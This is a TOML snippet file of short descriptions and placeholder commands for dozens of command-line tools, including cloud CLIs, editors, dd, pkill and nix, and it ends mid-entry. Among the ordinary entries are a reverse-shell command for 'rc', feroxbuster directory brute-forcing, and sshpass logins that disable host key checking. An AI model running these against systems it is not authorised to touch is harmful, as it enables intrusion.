[[snippets]]
  description = "Open a specific organization in the default web browser"
  command = "sf force:org:open --targetusername <organization>"
  output = ""

[[snippets]]
  description = "Display information about a specific organization"
  command = "sf force:org:display --targetusername <organization>"
  output = ""

[[snippets]]
  description = "Push source metadata to an Organization"
  command = "sf force:source:push --targetusername <organization>"
  output = ""

[[snippets]]
  description = "Pull source metadata from an Organization"
  command = "sf force:source:pull --targetusername <organization>"
  output = ""

[[snippets]]
  description = "Generate a password for the organization's logged-in user"
  command = "sf force:user:password:generate --targetusername <organization>"
  output = ""

[[snippets]]
  description = "Assign a permission set for the organization's logged-in user"
  command = "sf force:user:permset:assign --permsetname <permission_set_name> --targetusername <organization>"
  output = ""

[[snippets]]
  description = "Analyze a heap dump (from `jmap`), view via HTTP on port 7000"
  command = "jhat <dump_file.bin>"
  output = ""

[[snippets]]
  description = "Analyze a heap dump, specifying an alternate port for the http server"
  command = "jhat -p <port> <dump_file.bin>"
  output = ""

[[snippets]]
  description = "Analyze a dump letting `jhat` use up to 8 GB RAM (2-4x dump size recommended)"
  command = "jhat -J-mx8G <dump_file.bin>"
  output = ""

[[snippets]]
  description = "Open a file in an existing Emacs server (using GUI if available)"
  command = "emacsclient <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file in console mode (without an X window)"
  command = "emacsclient --no-window-system <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file in a new Emacs window"
  command = "emacsclient --create-frame <path/to/file>"
  output = ""

[[snippets]]
  description = "Evaluate a command, printing the output to `stdout`, and then quit"
  command = "emacsclient --eval '(<command>)'"
  output = ""

[[snippets]]
  description = "Specify an alternative editor in case no Emacs server is running"
  command = "emacsclient --alternate-editor <editor> <path/to/file>"
  output = ""

[[snippets]]
  description = "Stop a running Emacs server and all its instances, asking for confirmation on unsaved files"
  command = "emacsclient --eval '(save-buffers-kill-emacs)'"
  output = ""

[[snippets]]
  description = "Show all refs in the repository"
  command = "git show-ref"
  output = ""

[[snippets]]
  description = "Show only heads references"
  command = "git show-ref --heads"
  output = ""

[[snippets]]
  description = "Show only tags references"
  command = "git show-ref --tags"
  output = ""

[[snippets]]
  description = "Verify that a given reference exists"
  command = "git show-ref --verify <path/to/ref>"
  output = ""

[[snippets]]
  description = "Rename a file or directory when the target is not an existing directory"
  command = "mv <path/to/source> <path/to/target>"
  output = ""

[[snippets]]
  description = "Move a file or directory into an existing directory"
  command = "mv <path/to/source> <path/to/existing_directory>"
  output = ""

[[snippets]]
  description = "Move multiple files into an existing directory, keeping the filenames unchanged"
  command = "mv <path/to/source1 path/to/source2 ...> <path/to/existing_directory>"
  output = ""

[[snippets]]
  description = "Do not prompt for confirmation before overwriting existing files"
  command = "mv -f <path/to/source> <path/to/target>"
  output = ""

[[snippets]]
  description = "Prompt for confirmation before overwriting existing files, regardless of file permissions"
  command = "mv -i <path/to/source> <path/to/target>"
  output = ""

[[snippets]]
  description = "Do not overwrite existing files at the target"
  command = "mv -n <path/to/source> <path/to/target>"
  output = ""

[[snippets]]
  description = "Move files in verbose mode, showing files after they are moved"
  command = "mv -v <path/to/source> <path/to/target>"
  output = ""

[[snippets]]
  description = "List all properties in one's active configuration"
  command = "gcloud config list"
  output = ""

[[snippets]]
  description = "Login to a Google account"
  command = "gcloud auth login"
  output = ""

[[snippets]]
  description = "Set the active project"
  command = "gcloud config set project <project_name>"
  output = ""

[[snippets]]
  description = "SSH into a virtual machine instance"
  command = "gcloud compute ssh <user>@<instance>"
  output = ""

[[snippets]]
  description = "Display all Google Compute Engine instances in a project (by default instances from all zones are listed)"
  command = "gcloud compute instances list"
  output = ""

[[snippets]]
  description = "Update a kubeconfig file with the appropriate credentials to point `kubectl` to a specific cluster in Google Kubernetes Engine (GKE)"
  command = "gcloud container clusters get-credentials <cluster_name>"
  output = ""

[[snippets]]
  description = "Update all `gcloud` components"
  command = "gcloud components update"
  output = ""

[[snippets]]
  description = "Display help for a given command"
  command = "gcloud help <command>"
  output = ""

[[snippets]]
  description = "Connect to a remote server using a password supplied on a file descriptor (in this case, `stdin`)"
  command = "sshpass -d <0> ssh <user>@<hostname>"
  output = ""

[[snippets]]
  description = "Connect to a remote server with the password supplied as an option, and automatically accept unknown ssh keys"
  command = "sshpass -p <password> ssh -o StrictHostKeyChecking=no <user>@<hostname>"
  output = ""

[[snippets]]
  description = "Connect to a remote server using the first line of a file as the password, automatically accept unknown ssh keys, and launch a command"
  command = "sshpass -f <path/to/file> ssh -o StrictHostKeyChecking=no <user>@<hostname> ""<command>"""
  output = ""

[[snippets]]
  description = "Build a Nix expression"
  command = "nix-build '<nixpkgs>' --attr <firefox>"
  output = ""

[[snippets]]
  description = "Build a sandboxed Nix expression (on non-NixOS)"
  command = "nix-build '<nixpkgs>' --attr <firefox> --option sandbox true"
  output = ""

[[snippets]]
  description = "Enable autostart for the storage pool specified by name or UUID (determine using `virsh pool-list`)"
  command = "virsh pool-autostart --pool <name|uuid>"
  output = ""

[[snippets]]
  description = "Disable autostart for the storage pool specified by name or UUID"
  command = "virsh pool-autostart --pool <name|uuid> --disable"
  output = ""

[[snippets]]
  description = "Add any command to the default queue"
  command = "pueue add <command>"
  output = ""

[[snippets]]
  description = "Pass a list of flags or arguments to a command when enqueuing"
  command = "pueue add -- <command --arg -f>"
  output = ""

[[snippets]]
  description = "Add a command but do not start it if it's the first in a queue"
  command = "pueue add --stashed -- <rsync --archive --compress /local/directory /remote/directory>"
  output = ""

[[snippets]]
  description = "Add a command to a group and start it immediately, see `pueue group` to manage groups"
  command = "pueue add --immediate --group ""<CPU_intensive>"" -- <ffmpeg -i input.mp4 frame_%d.png>"
  output = ""

[[snippets]]
  description = "Add a command and start it after commands 9 and 12 finish successfully"
  command = "pueue add --after <9> <12> --group ""<torrents>"" -- <transmission-cli torrent_file.torrent>"
  output = ""

[[snippets]]
  description = "Add a command with a label after some delay has passed, see `pueue enqueue` for valid datetime formats"
  command = "pueue add --label ""<compressing large file>"" --delay ""<wednesday 10:30pm>"" -- ""<7z a compressed_file.7z large_file.xml>"""
  output = ""

[[snippets]]
  description = "Extract an archive to the current directory"
  command = "unar <archive>"
  output = ""

[[snippets]]
  description = "Extract an archive to the specified directory"
  command = "unar -o <path/to/directory> <archive>"
  output = ""

[[snippets]]
  description = "Force overwrite if files to be unpacked already exist"
  command = "unar -f <archive>"
  output = ""

[[snippets]]
  description = "Force rename if files to be unpacked already exist"
  command = "unar -r <archive>"
  output = ""

[[snippets]]
  description = "Force skip if files to be unpacked already exist"
  command = "unar -s <archive>"
  output = ""

[[snippets]]
  description = "Copy a PPM image (i.e. a PBM, PGM or PPM image) from `stdin` to `stdout`"
  command = "ppmtoppm < <path/to/image.ppm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "ppmtoppm -version"
  output = ""

[[snippets]]
  description = "Test a server (run every check) on port 443"
  command = "testssl <example.com>"
  output = ""

[[snippets]]
  description = "Test a different port"
  command = "testssl <example.com:465>"
  output = ""

[[snippets]]
  description = "Only check available protocols"
  command = "testssl --protocols <example.com>"
  output = ""

[[snippets]]
  description = "Only check vulnerabilities"
  command = "testssl --vulnerable <example.com>"
  output = ""

[[snippets]]
  description = "Only check HTTP security headers"
  command = "testssl --headers <example.com>"
  output = ""

[[snippets]]
  description = "Test other STARTTLS enabled protocols"
  command = "testssl --starttls <ftp|smtp|pop3|imap|xmpp|sieve|xmpp-server|telnet|ldap|irc|lmtp|nntp|postgres|mysql> <example.com>:<port>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to a BMP file"
  command = "ppmtobmp <path/to/file.ppm> > <path/to/file.bmp>"
  output = ""

[[snippets]]
  description = "Explicitly specify whether or not a Windows BMP file or an OS/2 BMP file should be created"
  command = "ppmtobmp -<windows|os2> <path/to/file.ppm> > <path/to/file.bmp>"
  output = ""

[[snippets]]
  description = "Use a specific number of bits for each pixel"
  command = "ppmtobmp -bbp <1|4|8|24> <path/to/file.ppm> > <path/to/file.bmp>"
  output = ""

[[snippets]]
  description = "Toggle play/pause"
  command = "mpc toggle"
  output = ""

[[snippets]]
  description = "Stop playing"
  command = "mpc stop"
  output = ""

[[snippets]]
  description = "Show information about the currently playing song"
  command = "mpc status"
  output = ""

[[snippets]]
  description = "Play next song"
  command = "mpc next"
  output = ""

[[snippets]]
  description = "Play previous song"
  command = "mpc prev"
  output = ""

[[snippets]]
  description = "Forward or rewind the currently playing song"
  command = "mpc [+-]<seconds>"
  output = ""

[[snippets]]
  description = "Run a speed test"
  command = "speedtest"
  output = ""

[[snippets]]
  description = "Run a speed test and specify the unit of the output"
  command = "speedtest --unit=<auto-decimal-bits|auto-decimal-bytes|auto-binary-bits|auto-binary-bytes>"
  output = ""

[[snippets]]
  description = "Run a speed test and specify the output format"
  command = "speedtest --format=<human-readable|csv|tsv|json|jsonl|json-pretty>"
  output = ""

[[snippets]]
  description = "Run a speed test and specify the number of decimal points to use (0 to 8, defaults to 2)"
  command = "speedtest --precision=<precision>"
  output = ""

[[snippets]]
  description = "Run a speed test and print its progress (only available for output format `human-readable` and `json`)"
  command = "speedtest --progress=<yes|no>"
  output = ""

[[snippets]]
  description = "List all `speedtest.net` servers, sorted by distance"
  command = "speedtest --servers"
  output = ""

[[snippets]]
  description = "Run a speed test to a specific `speedtest.net` server"
  command = "speedtest --server-id=<server_id>"
  output = ""

[[snippets]]
  description = "Upload a file to transfer.sh"
  command = "transfersh <path/to/file>"
  output = ""

[[snippets]]
  description = "Upload a file showing a progress bar (requires Python package `requests_toolbelt`)"
  command = "transfersh --progress <path/to/file>"
  output = ""

[[snippets]]
  description = "Upload a file using a different file name"
  command = "transfersh --name <filename> <path/to/file>"
  output = ""

[[snippets]]
  description = "Upload a file to a custom transfer.sh server"
  command = "transfersh --servername <upload.server.name> <path/to/file>"
  output = ""

[[snippets]]
  description = "Upload all files from a directory recursively"
  command = "transfersh --recursive <path/to/directory/>"
  output = ""

[[snippets]]
  description = "Upload a specific directory as an uncompressed tar"
  command = "transfersh -rt <path/to/directory>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xz"
  output = ""

[[snippets]]
  description = "Send an empty request"
  command = "grpcurl <grpc.server.com:443> <my.custom.server.Service/Method>"
  output = ""

[[snippets]]
  description = "Send a request with a header and a body"
  command = "grpcurl -H ""<Authorization: Bearer $token>"" -d <'{""foo"": ""bar""}'> <grpc.server.com:443> <my.custom.server.Service/Method>"
  output = ""

[[snippets]]
  description = "List all services exposed by a server"
  command = "grpcurl <grpc.server.com:443> list"
  output = ""

[[snippets]]
  description = "List all methods in a particular service"
  command = "grpcurl <grpc.server.com:443> list <my.custom.server.Service>"
  output = ""

[[snippets]]
  description = "View documentation for the current command"
  command = "tldr winicontopam"
  output = ""

[[snippets]]
  description = "Create a container in a storage account"
  command = "az storage container create --account-name <storage_account_name> --name <container_name> --public-access <access_level> --fail-on-exist"
  output = ""

[[snippets]]
  description = "Generate a shared access signature for the container"
  command = "az storage container generate-sas --account-name <storage_account_name> --name <container_name> --permissions <sas_permissions> --expiry <expiry_date> --https-only"
  output = ""

[[snippets]]
  description = "List containers in a storage account"
  command = "az storage container list --account-name <storage_account_name> --prefix <filter_prefix>"
  output = ""

[[snippets]]
  description = "Mark the specified container for deletion"
  command = "az storage container delete --account-name <storage_account_name> --name <container_name> --fail-not-exist"
  output = ""

[[snippets]]
  description = "Concatenate `warts` files into one"
  command = "sc_wartscat -o <path/to/output.warts> <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "List all available plugins"
  command = "asdf plugin list all"
  output = ""

[[snippets]]
  description = "Install a plugin"
  command = "asdf plugin add <name>"
  output = ""

[[snippets]]
  description = "List all available versions for a package"
  command = "asdf list all <name>"
  output = ""

[[snippets]]
  description = "Install a specific version of a package"
  command = "asdf install <name> <version>"
  output = ""

[[snippets]]
  description = "Set global version for a package"
  command = "asdf global <name> <version>"
  output = ""

[[snippets]]
  description = "Set local version for a package"
  command = "asdf local <name> <version>"
  output = ""

[[snippets]]
  description = "Check the correctness of the current project's manifest"
  command = "cargo verify-project"
  output = ""

[[snippets]]
  description = "Check the correctness of the specified manifest file"
  command = "cargo verify-project --manifest-path <path/to/Cargo.toml>"
  output = ""

[[snippets]]
  description = "Grant direnv permission to load the `.envrc` present in the current directory"
  command = "direnv allow <.>"
  output = ""

[[snippets]]
  description = "Revoke the authorization to load the `.envrc` present in the current directory"
  command = "direnv deny <.>"
  output = ""

[[snippets]]
  description = "Edit the `.envrc` file in the default text editor and reload the environment on exit"
  command = "direnv edit <.>"
  output = ""

[[snippets]]
  description = "Trigger a reload of the environment"
  command = "direnv reload"
  output = ""

[[snippets]]
  description = "Print some debug status information"
  command = "direnv status"
  output = ""

[[snippets]]
  description = "Generate documentation for Java source code and save the result in a directory"
  command = "javadoc -d <path/to/directory/> <path/to/java_source_code>"
  output = ""

[[snippets]]
  description = "Generate documentation with a specific encoding"
  command = "javadoc -docencoding <UTF-8> <path/to/java_source_code>"
  output = ""

[[snippets]]
  description = "Generate documentation excluding some packages"
  command = "javadoc -exclude <package_list> <path/to/java_source_code>"
  output = ""

[[snippets]]
  description = "Print the starship integration code for the specified shell"
  command = "starship init <bash|elvish|fish|ion|powershell|tcsh|zsh>"
  output = ""

[[snippets]]
  description = "Explain each part of the current prompt and show the time taken to render them"
  command = "starship explain"
  output = ""

[[snippets]]
  description = "Print the computed starship configuration (use `--default` to print default configuration instead)"
  command = "starship print-config"
  output = ""

[[snippets]]
  description = "List supported modules"
  command = "starship module --list"
  output = ""

[[snippets]]
  description = "Edit the starship configuration in the default editor"
  command = "starship configure"
  output = ""

[[snippets]]
  description = "Create a bug report GitHub issue pre-populated with information about the system and starship configuration"
  command = "starship bug-report"
  output = ""

[[snippets]]
  description = "Print the completion script for the specified shell"
  command = "starship completions <bash|elvish|fish|powershell|zsh>"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "starship <subcommand> --help"
  output = ""

[[snippets]]
  description = "Show the repository browser for the current Git repository"
  command = "gitk"
  output = ""

[[snippets]]
  description = "Show repository browser for a specific file or directory"
  command = "gitk <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Show commits made since 1 week ago"
  command = "gitk --since=""<1 week ago>"""
  output = ""

[[snippets]]
  description = "Show commits older than 1/1/2016"
  command = "gitk --until=""<1/1/2015>"""
  output = ""

[[snippets]]
  description = "Show at most 100 changes in all branches"
  command = " gitk --max-count=<100> --all"
  output = ""

[[snippets]]
  description = "Create a new repository in a named file"
  command = "fossil init <path/to/filename>"
  output = ""

[[snippets]]
  description = "Flash a firmware file to an ESP chip with a given port and baud rate"
  command = "sudo esptool.py --port <port> --baud <baud_rate> write_flash 0x0 <path/to/firmware.bin>"
  output = ""

[[snippets]]
  description = "Clear the flash of an ESP chip"
  command = "sudo esptool.py --port <port> --baud <baud_rate> erase_flash"
  output = ""

[[snippets]]
  description = "Detect embedded data in a PNG"
  command = "zsteg <path/to/image.png>"
  output = ""

[[snippets]]
  description = "Detect embedded data in a BMP image, using all known methods"
  command = "zsteg --all <path/to/image.bmp>"
  output = ""

[[snippets]]
  description = "Detect embedded data in a PNG, iterating pixels vertically and using MSB first"
  command = "zsteg --msb --order yx <path/to/image.png>"
  output = ""

[[snippets]]
  description = "Detect embedded data in a BMP image, specifying the bits to consider"
  command = "zsteg --bits <1,2,3|1-3> <path/to/image.bmp>"
  output = ""

[[snippets]]
  description = "Detect embedded data in a PNG, extracting only prime pixels and inverting bits"
  command = "zsteg --prime --invert <path/to/image.png>"
  output = ""

[[snippets]]
  description = "Detect embedded data in a BMP image, specifying the minimum length of the strings to be found and the find mode"
  command = "zsteg --min-str-len <10> --strings <first|all|longest|none> <path/to/image.bmp>"
  output = ""

[[snippets]]
  description = "Parse and execute a PHP script"
  command = "php <path/to/file>"
  output = ""

[[snippets]]
  description = "Check syntax on (i.e. lint) a PHP script"
  command = "php -l <path/to/file>"
  output = ""

[[snippets]]
  description = "Run PHP interactively"
  command = "php -a"
  output = ""

[[snippets]]
  description = "Run PHP code (Notes: Don't use <? ?> tags; escape double quotes with backslash)"
  command = "php -r ""<code>"""
  output = ""

[[snippets]]
  description = "Start a PHP built-in web server in the current directory"
  command = "php -S <host:port>"
  output = ""

[[snippets]]
  description = "List installed PHP extensions"
  command = "php -m"
  output = ""

[[snippets]]
  description = "Display information about the current PHP configuration"
  command = "php -i"
  output = ""

[[snippets]]
  description = "Display information about a specific function"
  command = "php --rf <function_name>"
  output = ""

[[snippets]]
  description = "Enable the `nix` command"
  command = "mkdir -p ~/.config/nix; echo 'experimental-features = nix-command flakes' > ~/.config/nix/nix.conf"
  output = ""

[[snippets]]
  description = "Search for a package in nixpkgs via its name or description"
  command = "nix search nixpkgs <search_term>"
  output = ""

[[snippets]]
  description = "Start a shell with the specified packages from nixpkgs available"
  command = "nix shell <nixpkgs#pkg1 nixpkgs#pkg2 nixpkgs#pkg3 ...>"
  output = ""

[[snippets]]
  description = "Install some packages from nixpkgs permanently"
  command = "nix profile install <nixpkgs#pkg1 nixpkgs#pkg2 nixpkgs#pkg3 ...>"
  output = ""

[[snippets]]
  description = "Remove unused paths from Nix store to free up space"
  command = "nix store gc"
  output = ""

[[snippets]]
  description = "Start an interactive environment for evaluating Nix expressions"
  command = "nix repl"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "nix help <subcommand>"
  output = ""

[[snippets]]
  description = "List datasets"
  command = "aws quicksight list-data-sets --aws-account-id <aws_account_id>"
  output = ""

[[snippets]]
  description = "List users"
  command = "aws quicksight list-users --aws-account-id <aws_account_id> --namespace default"
  output = ""

[[snippets]]
  description = "List groups"
  command = "aws quicksight list-groups --aws-account-id <aws_account_id> --namespace default"
  output = ""

[[snippets]]
  description = "List dashboards"
  command = "aws quicksight list-dashboards --aws-account-id <aws_account_id>"
  output = ""

[[snippets]]
  description = "Display detailed information about a dataset"
  command = "aws quicksight describe-data-set --aws-account-id <aws_account_id> --data-set-id <data_set_id>"
  output = ""

[[snippets]]
  description = "Display who has access to the dataset and what kind of actions they can perform on the dataset"
  command = "aws quicksight describe-data-set-permissions --aws-account-id <aws_account_id> --data-set-id <data_set_id>"
  output = ""

[[snippets]]
  description = "Discover specific directories and files that match in the wordlist with extensions and 100 threads and a random user-agent"
  command = "feroxbuster --url ""<https://example.com>"" --wordlist <path/to/file> --threads <100> --extensions ""<php,txt>"" --random-agent"
  output = ""

[[snippets]]
  description = "Enumerate directories without recursion through a specific proxy"
  command = "feroxbuster --url ""<https://example.com>"" --wordlist <path/to/file> --no-recursion --proxy ""<http://127.0.0.1:8080>"""
  output = ""

[[snippets]]
  description = "Find links in webpages"
  command = "feroxbuster --url ""<https://example.com>"" --extract-links"
  output = ""

[[snippets]]
  description = "Filter by a specific status code and a number of chars"
  command = "feroxbuster --url ""<https://example.com>"" --filter-status <301> --filter-size <4092>"
  output = ""

[[snippets]]
  description = "Set an environment variable"
  command = "export <VARIABLE>=<value>"
  output = ""

[[snippets]]
  description = "Append a pathname to the environment variable `PATH`"
  command = "export PATH=$PATH:<path/to/append>"
  output = ""

[[snippets]]
  description = "Start listening on a specific port"
  command = "rc -lp <port>"
  output = ""

[[snippets]]
  description = "Start a reverse shell"
  command = "rc <host> <port> -r <shell>"
  output = ""

[[snippets]]
  description = "Truncate the Elasticsearch index"
  command = "cradle elastic flush"
  output = ""

[[snippets]]
  description = "Truncate the Elasticsearch index for a specific package"
  command = "cradle elastic flush <package>"
  output = ""

[[snippets]]
  description = "Submit the Elasticsearch schema"
  command = "cradle elastic map"
  output = ""

[[snippets]]
  description = "Submit the Elasticsearch schema for a specific package"
  command = "cradle elastic map <package>"
  output = ""

[[snippets]]
  description = "Populate the Elasticsearch indices for all packages"
  command = "cradle elastic populate"
  output = ""

[[snippets]]
  description = "Populate the Elasticsearch indices for a specific package"
  command = "cradle elastic populate <package>"
  output = ""

[[snippets]]
  description = "Backup your Charm account keys"
  command = "charm backup-keys"
  output = ""

[[snippets]]
  description = "Backup Charm account keys to a specific location"
  command = "charm backup-keys -o <path/to/output_file.tar>"
  output = ""

[[snippets]]
  description = "Import previously backed up Charm account keys"
  command = "charm import-keys ""<charm-keys-backup.tar>"""
  output = ""

[[snippets]]
  description = "Find where your `cloud.charm.sh` folder resides on your machine"
  command = "charm where"
  output = ""

[[snippets]]
  description = "Start your Charm server"
  command = "charm serve"
  output = ""

[[snippets]]
  description = "Print linked SSH keys"
  command = "charm keys"
  output = ""

[[snippets]]
  description = "Print your Charm ID"
  command = "charm id"
  output = ""

[[snippets]]
  description = "Trim some whitespace using a regular expression (output stream: `stdout`)"
  command = "<echo 'lorem ipsum 23   '> | sd '\s+$' ''"
  output = ""

[[snippets]]
  description = "Replace words using capture groups (output stream: `stdout`)"
  command = "<echo 'cargo +nightly watch'> | sd '(\w+)\s+\+(\w+)\s+(\w+)' 'cmd: $1, channel: $2, subcmd: $3'"
  output = ""

[[snippets]]
  description = "Find and replace in a specific file (output stream: `stdout`)"
  command = "sd -p <'window.fetch'> <'fetch'> <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Find and replace in all files in the current project (output stream: `stdout`)"
  command = "sd <'from ""react""'> <'from ""preact""'> ""$(find . -type f)"""
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xzmore"
  output = ""

[[snippets]]
  description = "Make a bootable USB drive from an isohybrid file (such like `archlinux-xxx.iso`)"
  command = "dd if=<path/to/file.iso> of=/dev/<usb_drive>"
  output = ""

[[snippets]]
  description = "Clone a drive to another drive with 4 MiB block and ignore error"
  command = "dd if=/dev/<source_drive> of=/dev/<dest_drive> bs=<4194304> conv=<noerror>"
  output = ""

[[snippets]]
  description = "Generate a file of 100 random bytes by using kernel random driver"
  command = "dd if=/dev/urandom of=<path/to/random_file> bs=<100> count=<1>"
  output = ""

[[snippets]]
  description = "Benchmark the write performance of a disk"
  command = "dd if=/dev/zero of=<path/to/file_1GB> bs=<1024> count=<1000000>"
  output = ""

[[snippets]]
  description = "Generate a system backup into an IMG file"
  command = "dd if=</dev/drive_device> of=<path/to/file.img>"
  output = ""

[[snippets]]
  description = "Restore a drive from an IMG file"
  command = "dd if=<path/to/file.img> of=</dev/drive_device>"
  output = ""

[[snippets]]
  description = "Convert a file to the text format and display it to the console"
  command = "wasm2wat <file.wasm>"
  output = ""

[[snippets]]
  description = "Write the output to a given file"
  command = "wasm2wat <file.wasm> -o <file.wat>"
  output = ""

[[snippets]]
  description = "Create a new table in the storage account"
  command = "az storage table create --account-name <storage_account_name> --name <table_name> --fail-on-exist"
  output = ""

[[snippets]]
  description = "Generate a shared access signature for the table"
  command = "az storage table generate-sas --account-name <storage_account_name> --name <table_name> --permissions <sas_permissions> --expiry <expiry_date> --https-only"
  output = ""

[[snippets]]
  description = "List tables in a storage account"
  command = "az storage table list --account-name <storage_account_name>"
  output = ""

[[snippets]]
  description = "Delete the specified table and any data it contains"
  command = "az storage table delete --account-name <storage_account_name> --name <table_name> --fail-not-exist"
  output = ""

[[snippets]]
  description = "Kill all processes which match"
  command = "pkill ""<process_name>"""
  output = ""

[[snippets]]
  description = "Kill all processes which match their full command instead of just the process name"
  command = "pkill -f ""<command_name>"""
  output = ""

[[snippets]]
  description = "Force kill matching processes (can't be blocked)"
  command = "pkill -9 ""<process_name>"""
  output = ""

[[snippets]]
  description = "Send SIGUSR1 signal to processes which match"
  command = "pkill -USR1 ""<process_name>"""
  output = ""

[[snippets]]
  description = "Kill the main `firefox` process to close the browser"
  command = "pkill --oldest ""<firefox>"""
  output = ""

[[snippets]]
  description = "List all registries"
  command = "nrm ls"
  output = ""

[[snippets]]
  description = "Change to a particular registry"
  command = "nrm use <registry>"
  output = ""

[[snippets]]
  description = "Show the response time for all registries"
  command = "nrm test"
  output = ""

[[snippets]]
  description = "Add a custom registry"
  command = "nrm add <registry> <url>"
  output = ""

[[snippets]]
  description = "Delete a registry"
  command = "nrm del <registry>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xzgrep"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a MGR bitmap"
  command = "pbmtomgr <path/to/image.pbm> > <path/to/output.mgr>"
  output = ""

[[snippets]]
  description = "Compress a PNG with default settings"
  command = "optipng <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a PNG with the best compression"
  command = "optipng -o<7> <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a PNG with the fastest compression"
  command = "optipng -o<0> <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a PNG and add interlacing"
  command = "optipng -i <1> <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a PNG and preserve all metadata (including file timestamps)"
  command = "optipng -preserve <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a PNG and remove all metadata"
  command = "optipng -strip all <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Serve a `.js` or `.vue` file in development mode with zero config"
  command = "vue serve <filename>"
  output = ""

[[snippets]]
  description = "Describe the format and basic characteristics of an image"
  command = "identify <path/to/image>"
  output = ""

[[snippets]]
  description = "Describe the format and verbose characteristics of an image"
  command = "identify -verbose <path/to/image>"
  output = ""

[[snippets]]
  description = "Collect dimensions of all JPEG files in the current directory and save them into a CSV file"
  command = "identify -format ""<%f,%w,%h\n>"" <*.jpg> > <path/to/filelist.csv>"
  output = ""

[[snippets]]
  description = "Run with the GUI"
  command = "zotero"
  output = ""

[[snippets]]
  description = "Run in headless mode"
  command = "zotero --headless"
  output = ""

[[snippets]]
  description = "Run with a specific profile"
  command = "zotero -P <profile>"
  output = ""

[[snippets]]
  description = "Run the Migration Assistant"
  command = "zotero --migration"
  output = ""

[[snippets]]
  description = "Output the first few lines of a file"
  command = "head -n <count> <path/to/file>"
  output = ""

[[snippets]]
  description = "Write a specific image to a specific block device"
  command = "rpi-imager --cli <path/to/image.zip> </dev/sdX>"
  output = ""

[[snippets]]
  description = "Write a specific image to a block device, disabling the checksum verification"
  command = "rpi-imager --cli --disable-verify <path/to/image.zip> </dev/sdX>"
  output = ""

[[snippets]]
  description = "Write a specific image to a block device, which will expect a specific checksum when running the verification"
  command = "rpi-imager --cli --sha256 <expected_hash> <path/to/image.zip> </dev/sdX>"
  output = ""

[[snippets]]
  description = "Open the homepage of the current repository in the default web browser"
  command = "hub browse"
  output = ""

[[snippets]]
  description = "Open the homepage of a specific repository in the default web browser"
  command = "hub browse <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Open the subpage of a specific repository in the default web browser, subpage can be "wiki", "commits", "issues", or other (default: "tree")"
  command = "hub browse <owner>/<repository> <subpage>"
  output = ""

[[snippets]]
  description = "Add a new configuration"
  command = "jf config add"
  output = ""

[[snippets]]
  description = "Show the current configuration"
  command = "jf config show"
  output = ""

[[snippets]]
  description = "Search for artifacts within the given repository and directory"
  command = "jf rt search --recursive <repostiory_name>/<path>/"
  output = ""

[[snippets]]
  description = "Browse for both SSH and VNC servers"
  command = "bshell"
  output = ""

[[snippets]]
  description = "Browse for SSH servers only"
  command = "bshell --ssh"
  output = ""

[[snippets]]
  description = "Browse for VNC servers only"
  command = "bshell --vnc"
  output = ""

[[snippets]]
  description = "Browse for both SSH and VNC servers in a specified domain"
  command = "bshell --domain=<domain>"
  output = ""

[[snippets]]
  description = "Execute a DVC subcommand"
  command = "dvc <subcommand>"
  output = ""

[[snippets]]
  description = "Display general help"
  command = "dvc --help"
  output = ""

[[snippets]]
  description = "Display help about a specific subcommand"
  command = "dvc <subcommand> --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "dvc --version"
  output = ""

[[snippets]]
  description = "Create a new functions project"
  command = "func init <project>"
  output = ""

[[snippets]]
  description = "Create a new function"
  command = "func new"
  output = ""

[[snippets]]
  description = "Run functions locally"
  command = "func start"
  output = ""

[[snippets]]
  description = "Publish your code to a function app in Azure"
  command = "func azure functionapp publish <function>"
  output = ""

[[snippets]]
  description = "Download all settings from an existing function app"
  command = "func azure functionapp fetch-app-settings <function>"
  output = ""

[[snippets]]
  description = "Get the connection string for a specific storage account"
  command = "func azure storage fetch-connection-string <storage_account>"
  output = ""

[[snippets]]
  description = "Log in to the OpenShift Container Platform server"
  command = "oc login"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "oc new-project <project_name>"
  output = ""

[[snippets]]
  description = "Switch to an existing project"
  command = "oc project <project_name>"
  output = ""

[[snippets]]
  description = "Add a new application to a project"
  command = "oc new-app <repo_url> --name <application>"
  output = ""

[[snippets]]
  description = "Open a remote shell session to a container"
  command = "oc rsh <pod_name>"
  output = ""

[[snippets]]
  description = "List pods in a project"
  command = "oc get pods"
  output = ""

[[snippets]]
  description = "Log out from the current session"
  command = "oc logout"
  output = ""

[[snippets]]
  description = "Uninstall a given Node.js version"
  command = "Remove-NodeVersion <node_version>"
  output = ""

[[snippets]]
  description = "Uninstall multiple Node.js versions"
  command = "Remove-NodeVersion <node_version1 , node_version2 , ...>"
  output = ""

[[snippets]]
  description = "Uninstall all currently-installed versions of Node.js 20.x"
  command = "Get-NodeVersions -Filter "">=20.0.0 <21.0.0"" | Remove-NodeVersion"
  output = ""

[[snippets]]
  description = "Uninstall all currently-installed versions of Node.js"
  command = "Get-NodeVersions | Remove-NodeVersion"
  output = ""

[[snippets]]
  description = "Display the client version"
  command = "travis version"
  output = ""

[[snippets]]
  description = "Authenticate the CLI client against the server, using an authentication token"
  command = "travis login"
  output = ""

[[snippets]]
  description = "List repositories the user has permissions on"
  command = "travis repos"
  output = ""

[[snippets]]
  description = "Encrypt values in `.travis.yml`"
  command = "travis encrypt <token>"
  output = ""

[[snippets]]
  description = "Generate a `.travis.yml` file and enable the project"
  command = "travis init"
  output = ""

[[snippets]]
